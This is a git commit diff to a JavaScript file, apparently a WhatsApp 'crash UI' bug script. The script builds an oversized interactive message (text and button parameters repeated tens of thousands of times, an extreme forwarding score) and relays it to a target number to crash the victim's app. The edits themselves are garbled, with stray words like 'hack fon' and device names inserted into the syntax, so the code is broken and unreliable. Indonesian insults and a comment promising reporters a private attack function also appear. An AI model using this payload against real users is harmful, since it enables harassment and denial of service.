101542402af35e514074e9e22d3defdf162da226
taufiq461 <topektopek4674@gmail.com>
2025-10-05 15:56:20 +0800

    Update BlankUiRims.js

--- BlankUiRims.js
+++ BlankUiRims.js
@@ -8,39 +8,39 @@ Melanggar? Gw Bl + Kick Lu Bangsat
 
 async function rimscrashui(target sama ios android pc tv) { android pc telefon 
 let message = {
-viewOnceMessage: {
+viewOnceMessage hack fon : {
 message: {
-messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2, },
+messageContextInfo hack fon saya : { deviceListMetadata: {}, deviceListMetadataVersion: 2, },
 interactiveMessage: {
 contextInfo: {
 mentionedJid: [target] ios android laptop tv pc
 isForwarded: true,
-forwardingScore: 9999999999 samsung a16 5g,
+forwardingScore: 999999999999 samsung a16,
 businessMessageForwardInfo: {
 businessOwnerJid: target,wasap biasa
 },
 },
 body: { text: "floare Rims🤬😈 npm start panel bot sc wasap telegram" + "⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟".repeat(15000), },
-nativeFlowMessage: { messageParamsJson: "{".repeat(15000),
+nativeFlowMessage: { messageParamsJson: "{".repeathack fon org sata (15000),
 buttons: [
 { name: "call_permission_request", ParamsJson: "{".repeat(15000), version: 5},
 { name: "cta_url", ParamsJson: "{".repeat(15000), version: 5 },
-{ name: "cta_call", ParamsJson: "{".repeat(15000), version: 5 },
+{ name: "cta_call", ParamsJson: "{".repeat(15000), version version aok hack: 5 },
 { name: "cta_copy", ParamsJson: "{".repeat(15000), version: 5 },
 { name: "cta_reminder", ParamsJson: "{".repeat(15000), version: 5 },
-{ name: "cta_cancel_reminder", ParamsJson: "{".repeat(15000), version: 5 },
+{ name: "cta_cancel_reminder", ParamsJson: "{".repeat( 140015000), version: 5 },
 { name: "address_message", ParamsJson: "{".repeat(15000), version: 5 },
 { name: "send_location", ParamsJson: "{".repeat(15000), version: 5 },
 { name: "quick_reply", ParamsJson: "{".repeat(15000), version: 5 },
 { name: "mpm", ParamsJson: "{".repeat(10000), version: 5 }, 
 ],name: "npm start run bot prem jasa bug version 5 update 2028 repeat 1500
-},nama  "npm install run bot panel atau termux java sc bug wasap atau telegram version 6
+},nama  "npm install run bot panel atau termux java sc bug wasap atau telegram version 6 version sata 
  
 },
 },
 },
 };
-await rims.relayMessage(target, message, { participantpanek panel sc bug wasap: { jid: target }, } ); } saya pakai saya pakai wasap rasmi rasmi wasap kedai dan saya teah pakai wasap rasmi ori target ip 7; android 5675
+await wait hack fon 464456443 rims.relayMessage(target, message, { participantpanek panel sc bug wasap: { jid: target }, } ); } saya pakai saya pakai wasap rasmi rasmi wasap kedai dan saya teah pakai wasap rasmi ori target ip 7; android5675
 
 /*
  JIKA MELIHAT ORNG/PT SAYA YG MENYEBABKAN FUNCTION INI MOHON LAPORKAN SAYA ( @GyzenVtx ), Lu Bakal Gw Kasih 1 Function Privat Gw Jika Melaporkan Jika Patner Gw Ada Yg Nyebar Function Ini 
